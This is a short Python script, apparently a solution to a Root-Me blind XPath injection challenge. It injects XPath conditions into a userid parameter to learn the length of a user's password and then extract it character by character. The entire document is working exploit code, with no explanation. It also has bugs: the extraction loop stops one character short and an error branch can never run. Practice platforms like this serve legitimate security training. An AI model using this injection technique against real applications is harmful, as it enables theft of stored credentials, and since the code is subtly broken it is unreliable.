#For a Root-Me challenge
import requests
import string
import os

pw_len = 0
pw = ""
url = "http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2 and "
for i in range (1,100):
	print("i=" + str(i))
	final_url = url + "string-length(//user[userid=2]/password)=" + str(i)
	res = requests.get(url=final_url)
	if "John's profile" in res.text:
		os.system("clear")
		pw_len = i
		print("long : " + str(i))
		break
	elif i==100:
		print("Error")
candidate = {"a": "substring(//user[userid=2]/account,1,1)",
        "b": "substring(//user[userid=1]/account,3,1)",
        "c": "substring(//user[userid=1]/account,5,1)",
        "d": "substring(//user[userid=2]/account,2,1)",
        "e": "substring(//user[userid=1]/account,9,1)",
        "g": "substring(//user[userid=2]/email,12,1)",
        "h": "substring(//user[userid=2]/email,3,1)",
        "i": "substring(//user[userid=3]/username,3,1)",
        "l": "substring(//user[userid=5]/username,2,1)",
        "m": "substring(//user[userid=2]/account,3,1)",
        "n": "substring(//user[userid=2]/username,4,1)",
        "o": "substring(//user[userid=2]/username,2,1)",
        "r": "substring(//user[userid=3]/username,2,1)",
        "s": "substring(//user[userid=1]/email,1,1)",
        "t": "substring(//user[userid=1]/email,2,1)",
        "u": "substring(//user[userid=3]/account,2,1)",
        "v": "substring(//user[userid=1]/username,4,1)",
        "y": "substring(//user[userid=4]/username,5,1)",
        "S": "substring(//user[userid=1]/username,1,1)",
        "J": "substring(//user[userid=2]/username,1,1)",
        "E": "substring(//user[userid=3]/username,1,1)",
        "@": "substring(//user[userid=3]/email,4,1)",
        ".": "substring(//user[userid=3]/email,8,1)",
	"0":"string(0)",
	"1":"string(1)",
	"2":"string(2)",
	"3":"string(3)",
	"4":"string(4)",
	"5":"string(5)",
	"6":"string(6)",
	"7":"string(7)",
	"8":"string(8)",
	"9":"string(9)"
}
for j in range(1, i):
	print("j=" + str(j))
	for key in candidate:
		print("key: " + key)
		final_url2 = url + "substring(//user[userid=2]/password," + str(j) + ",1)=" + candidate[key]
		res = requests.get(url = final_url2)
		if "John's" in res.text:
			pw += key
			os.system("clear")
			break
os.system("clear")
print("Password : " + pw)